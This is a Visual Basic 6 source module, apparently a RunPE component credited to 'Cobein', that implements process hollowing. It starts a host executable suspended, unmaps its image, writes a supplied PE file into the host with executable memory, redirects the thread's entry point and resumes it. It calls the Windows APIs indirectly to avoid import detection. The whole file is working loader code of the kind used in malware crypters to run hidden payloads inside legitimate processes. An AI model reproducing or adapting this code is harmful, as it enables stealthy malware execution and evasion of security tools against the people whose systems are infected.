Attribute VB_Name = "mPEL"
'---------------------------------------------------------------------------------------
' Module      : mPEL
' DateTime    : 06/09/2008 23:12
' Author      : Cobein
' Mail        : cobein27@hotmail.com
' WebPage     : http://www.advancevb.com.ar
' Purpose     :
' Usage       : At your own risk
' Requirements: None
' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission.
'
' Credits     : RunPE based on obsol33t version, call api from rm_code
'
' History     : 06/09/2008 First Cut....................................................
'---------------------------------------------------------------------------------------

Option Explicit

Private Const CONTEXT_FULL              As Long = &H10007
Private Const MAX_PATH                  As Integer = 1260
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40

'Private Const IMAGE_DOS_SIGNATURE           As Long = &H5A4D&
'Private Const IMAGE_NT_SIGNATURE            As Long = &H4550&
'Private Const IMAGE_NT_OPTIONAL_HDR32_MAGIC As Long = &H10B&

'Private Const SIZE_DOS_HEADER               As Long = &H40
'Private Const SIZE_NT_HEADERS               As Long = &HF8
'Private Const SIZE_SECTION_HEADER           As Long = &H28


Public Declare Sub CopyBytes Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)





Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessID As Long
    dwThreadID As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord As Long
    StatusWord As Long
    TagWord As Long
    ErrorOffset As Long
    ErrorSelector As Long
    DataOffset As Long
    DataSelector As Long
    RegisterArea(1 To 80) As Byte
    Cr0NpxState As Long
End Type

Private Type CONTEXT
    ContextFlags As Long

    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long

    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_SECTION_HEADER
    SecName As String * 8
    VirtualSize As Long
    VirtualAddress  As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLinenumbers As Long
    NumberOfRelocations As Integer
    NumberOfLinenumbers As Integer
    characteristics  As Long
End Type

Sub InjectExe(ByVal sHost As String, ByRef bvBuff() As Byte)
   On Error Resume Next
Dim Pidh As IMAGE_DOS_HEADER
Dim Pinh As IMAGE_NT_HEADERS
Dim Pish As IMAGE_SECTION_HEADER
Dim Si As STARTUPINFO
Dim Pi As PROCESS_INFORMATION
Dim Ctx As CONTEXT
Dim i As Long

    Si.cb = Len(Si)
    Ctx.ContextFlags = CONTEXT_FULL

    'Tnx Slayer616
    Call Dbgthis.CallAPI("kernel32", "RtlMoveMemory", VarPtr(Pidh), VarPtr(bvBuff(0)), Len(Pidh))
    Call Dbgthis.CallAPI("kernel32", "RtlMoveMemory", VarPtr(Pinh), VarPtr(bvBuff(Pidh.e_lfanew)), Len(Pinh))
    

    
    Call Dbgthis.CallAPI("kernel32", "CreateProcessW", 0, StrPtr(sHost), 0, 0, 0, CREATE_SUSPENDED, 0, 0, VarPtr(Si), VarPtr(Pi))
    Call Dbgthis.CallAPI("ntdll", "NtUnmapViewOfSection", Pi.hProcess, Pinh.OptionalHeader.ImageBase)
    
    
 
    
    Call Dbgthis.CallAPI("kernel32", "VirtualAllocEx", Pi.hProcess, Pinh.OptionalHeader.ImageBase, Pinh.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    Call Dbgthis.CallAPI("ntdll", "NtWriteVirtualMemory", Pi.hProcess, Pinh.OptionalHeader.ImageBase, VarPtr(bvBuff(0)), Pinh.OptionalHeader.SizeOfHeaders, 0)

For i = 0 To Pinh.FileHeader.NumberOfSections - 1

    CopyBytes Pish, bvBuff(Pidh.e_lfanew + Len(Pinh) + Len(Pish) * i), Len(Pish)
    Call Dbgthis.CallAPI("ntdll", "NtWriteVirtualMemory", Pi.hProcess, Pinh.OptionalHeader.ImageBase + Pish.VirtualAddress, VarPtr(bvBuff(Pish.PointerToRawData)), Pish.SizeOfRawData, 0)

Next

 
    Call Dbgthis.CallAPI("ntdll", "NtGetContextThread", Pi.hThread, VarPtr(Ctx))
    Call Dbgthis.CallAPI("ntdll", "NtWriteVirtualMemory", Pi.hProcess, Ctx.Ebx + 8, VarPtr(Pinh.OptionalHeader.ImageBase), 4, 0)

    Ctx.Eax = Pinh.OptionalHeader.ImageBase + Pinh.OptionalHeader.AddressOfEntryPoint
    Call Dbgthis.CallAPI("ntdll", "NtSetContextThread", Pi.hThread, VarPtr(Ctx))
  
    Call Dbgthis.CallAPI("ntdll", "NtResumeThread", Pi.hThread, 0)

End Sub



Public Function ThisExe() As String
    Dim lRet        As Long
    Dim bvBuff(255) As Byte
    lRet = Dbgthis.CallAPI("kernel32", "GetModuleFileNameA", App.hInstance, VarPtr(bvBuff(0)), 256)
    ThisExe = Left$(StrConv(bvBuff, vbUnicode), lRet)
End Function

